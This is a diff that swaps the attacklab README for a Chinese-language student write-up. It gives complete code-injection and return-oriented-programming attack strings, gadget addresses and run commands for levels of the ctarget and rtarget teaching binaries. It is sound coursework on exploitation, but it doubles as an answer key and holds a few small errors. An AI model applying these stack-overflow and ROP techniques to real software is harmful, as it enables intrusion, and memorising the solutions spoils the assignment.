@@ -1,28 +1,195 @@
-This file contains materials for one instance of the attacklab.
+###################################
+ctarget Level2:
 
-Files:
+分两次ret完成代码注入
+第一次先跳到字符里隐藏的可执行代码（机器码），这部分代码完成对rdi寄存器（函数第一个参数）的赋值，以及发起第二次ret
+```
+.intel_syntax noprefix
 
-    ctarget
+mov rdi, 0x59b997fa   /* send cookie */
+pushq 0x4017ec       /*set next fun touch2*/
+retq                     /* jmp to touch2 */
+```
 
-Linux binary with code-injection vulnerability.  To be used for phases
-1-3 of the assignment.
+第二次ret，通过上面的retq 跳到touch2函数的地址，且此时rdi寄存器已完成cookie赋值
 
-    rtarget
+所谓ret就是跳转，本实验限制使用jmp。
 
-Linux binary with return-oriented programming vulnerability.  To be
-used for phases 4-5 of the assignment.
+汇编代码对应的机器码可通过以下两步获取：
+```
+gcc -c xxx.s
+objdump -d xxx.o
+```
 
-     cookie.txt
+所以需要的字符是
+```
+## 13个字节机器码 会被放到栈底位置 即rsp位置 
+48 c7 c7 fa 97 b9 59
+68 ec 17 40 00
+c3
 
-Text file containing 4-byte signature required for this lab instance.
+## 中间27个字节的任意码 加到上面共40字节
+33 33 33 33   33 33 33 33
+33 33 33 33   33 33 33 33
+33 33 33 33   33 33 33 33
+33 33 33
 
-     farm.c
+# 8字节 导致栈溢出（只分配了40字节） 覆盖函数的返回地址 ret使用这个新地址跳转 跳到上面的机器码（48 c7...）
+78 dc 61 55   00 00 00 00
+```
 
-Source code for gadget farm present in this instance of rtarget.  You
-can compile (use flag -Og) and disassemble it to look for gadgets.
+使用如下命令测试结果：
+./hex2raw -i answer/cLevel2.txt | ./ctarget -q
 
-     hex2raw
 
-Utility program to generate byte sequences.  See documentation in lab
-handout.
 
+##################################
+ctarget Level3:
+
+传入参数不是个数字而是个地址，首先需要把cookie对应的字符串放到内存里：
+     不能放到buff对应40个字节里，看源码知道会被覆盖：char cbuf[110];  朴素地想有两个方案：
+     方案一： 往低地址放 比如往低走150个字节 跨过会被覆盖地区域。  不可行，因为我们能控制的代码都是从这个40字节buff开始往上放的。
+     方案二： 往高地址放，放到getbuf的栈帧里（有的叫父栈），不会被覆盖，即rsp+8的位置，8是因为有返回地址。 不要怕破坏getbuf的断电，因为我们就是在搞破坏。 具体值可以gdb中看： 0x5561dca0+8  就是放字符串的位置。
+
+所以插入的代码为：
+```
+.intel_syntax noprefix
+
+mov rdi, 0x5561dca8
+pushq 0x4018fa           ; touch3
+retq
+```
+
+生成机器码:
+```
+   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   7:   68 fa 18 40 00          pushq  $0x4018fa
+   c:   c3                      retq
+```
+
+综上，我们最后的攻击字符串是
+```
+48 c7 c7 a8 dc 61 55
+68 fa 18 40 00
+c3
+33 33 33 33   33 33 33 33
+33 33 33 33   33 33 33 33
+33 33 33 33   33 33 33 33
+33 33 33
+78 dc 61 55   00 00 00 00          // stack overflow后覆盖返回地址 指向本可执行代码（48 c7 ...） 首次ret用到
+0x35 
+35 39 62 39 39 37 66 61 00         // cookie 对应的字符串（ascii码） 00是字符串末尾的'/0'
+```
+
+
+
+##################################
+rtarget Level2
+增加随机栈地址技术和 区域权限限制技术后。 栈里的字节码不具备可执行权限，我们只能利用程序已有字节码，从中截取我们需要的部分执行。
+现在唯一的手段就是ret地址，其它入口不由我们控制。
+
+ret机制： 类似pop， 从rsp位置弹出一条8字节（x86-64）数据，同时rsp+=8，然后跳转到该数据表示的地址。
+
+popq机制：从rsp弹出一条4字数据，并存到自行指定的位置。
+
+---------
+
+现在可以解决该问题了： 
+   a: 通过栈溢出改变ret地址使之指向我们需要的字节码 （rtarget反汇编可得机器码） ret使rsp增加
+   b: 跳转的字节码需要以c3结尾 即ret。 ret会跳转增加后的rsp中的地址 这样我们就可以多溢出几句地址 完成多次跳转执行
+   c: 不断重复b， 直到到达最后一个函数，touchn
+
+
+具体的，b里面，我们需要什么机器码? 我们需要完成：
+```
+popq rax       ;把rsp（增加过的）的4字 放到rax.    58
+movq  rdi, rax  ;得到touchn的参数                  48 89 c7
+```
+
+每行指令下都要跟个ret，ret是为了实现跳到下一句需要的指令，最后一个ret是为了跳到touchn函数。
+为什么用rax保存cookie的值？ 其它的寄存器也可以，只要能找到对应机器码的都行。
+怎么确定这些指令的？ pdf里11页的表可启发
+怎么在rtarget机器码中找？ 根据pdf中的机器码全文搜索，注意加90尝试搜索，这个是空指令不影响执行效果. 注意不能用farm.c编译反汇编得到机器码，我们运行的是rtarget，直接用这个能更准确更全，而且有内存地址，只用farm.c编译是显然得不到正确的内存地址的。
+
+得到攻击串：
+```
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+ab 19 40 00    00 00 00 00    /* popq rax机器码地址 */
+fa 97 b9 59    00 00 00 00    /* cookie */
+c5 19 40 00    00 00 00 00    /* movq机器码地址 不唯一 */
+ec 17 40 00    00 00 00 00    /* touch2 地址 */
+```
+
+运行以下命令测试：
+./hex2raw -i answer/rLevel2.txt | ./rtarget -q
+
+
+###################################
+rtarget level3:
+实参变成了一个字符串的地址，字符串不需要可执行权限，放在stack即可
+
+需要完成：
+```
+popq rax          ; 放字符串的地址到rax
+movq rdi, rax     ; 放到rdi 完成实参赋值
+```
+
+逻辑没变，重点在把字符串地址和字符串本身放到内存，显然只能放到栈里。 而且，由于栈地址随机，如何确定字符串地址？
+即按照
+   a. popq machine code addr        // rsp
+   b. str addr                      // or other ways to assign rax an addr
+   c. movq rdi, rax
+   d. touch3 addr
+   e. cookie
+这种方式构造攻击串，b该如何解决？ 构造的str的地址相对rsp的偏移总是固定的。 想办法从机器码构造一个固定偏移的地址用来放cookie：
+可以从机器码中抠出以下汇编的机器码：
+```
+movq rax, rsp     ; 注意这里rsp已经相对于原rsp增加过8了，执行到这句需要ret ret的机制让rsp增加
+add al, 0x37      ; 37是机器码里固定的 pdf中没有add 需自行了解
+movq rdi, rax     ; cookie 存在rsp+0x37即可
+```
+
+综上，攻击串的信息顺序（省略ret）：
+```
+movq rax, rsp     ; 48 89 e0  0x401a06
+add al, 0x37      ; 04 37     0x4019d8
+movq rdi, rax     ; 48 89 c7  0x4019a2
+touch3 addr       ; 0x4018fa
+0x37 - 3*8 bytes  ; 55-24=31
+cookie            ; same as phase3
+```
+
+
+得到攻击串：
+```
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+06 1a 40 00    00 00 00 00
+d8 19 40 00    00 00 00 00
+a2 19 40 00    00 00 00 00
+fa 18 40 00    00 00 00 00
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33 33
+33 33 33 33    33 33 33
+35 39 62 39 39 37 66 61 00    /* cookie */
+```
+
+
+
+############################
+总结 
+CI 和 ROP的攻击方式都需要
+- 可以输入字符串
+- 导致栈溢出覆盖返回地址
+
+ROP比CI破解能力更强，可以突破栈地址随机化和权限限制的封锁
+
+cyberpunk2077里的破解就是用的机器码 很讲究
